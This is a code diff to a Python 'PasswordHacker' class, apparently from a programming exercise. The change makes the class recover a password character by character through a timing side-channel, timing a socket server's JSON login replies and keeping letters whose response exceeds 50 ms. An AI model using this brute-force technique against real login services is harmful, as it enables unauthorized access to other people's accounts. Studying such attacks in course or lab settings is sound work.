@@ -4,6 +4,7 @@ import sys
 import json
 import string
 from itertools import product
+from time import perf_counter_ns
 
 
 class PasswordHacker:
@@ -25,7 +26,7 @@ class PasswordHacker:
             self.my_socket.connect(self.address)
             self.find_login()
             self.find_password()
-            self.print_output()
+        self.print_output()
 
     def find_login(self):
         self.logger.debug("Start self.find_login()")
@@ -47,17 +48,23 @@ class PasswordHacker:
         password = ''
         while not self.password:
             for letter in symbols:
-                # self.logger.debug(f"Try the letter - {letter}")
                 my_json_data: str = json.dumps({'login': self.login, 'password': (password + letter)})
                 self.my_socket.send(my_json_data.encode())
+                time_start = perf_counter_ns()
                 response = json.loads(self.my_socket.recv(1024).decode())
-                if response['result'] == 'Wrong password!':
-                    # self.logger.debug(f"No...")
-                    continue
-                elif response['result'] == 'Exception happened during login':
+                time_finish = perf_counter_ns()
+                time = time_finish - time_start
+                # self.logger.debug(f"Letter {letter}, time - {time}")
+                if time > 50000000:
                     password += letter
-                    self.logger.debug(f"Exception happened when we sent - {password} !!!")
+                    self.logger.debug(f"time - {time} the beginning of the password - {password} !!!")
                     break
+                # elif response['result'] == 'Wrong password!':
+                #     continue
+                # elif response['result'] == 'Exception happened during login':
+                #     password += letter
+                #     self.logger.debug(f"Exception happened when we sent - {password} !!!")
+                #     break
                 elif response['result'] == 'Connection success!':
                     self.password = password + letter
                     self.logger.debug(f"Success - the password is  - {self.password} !!!!")
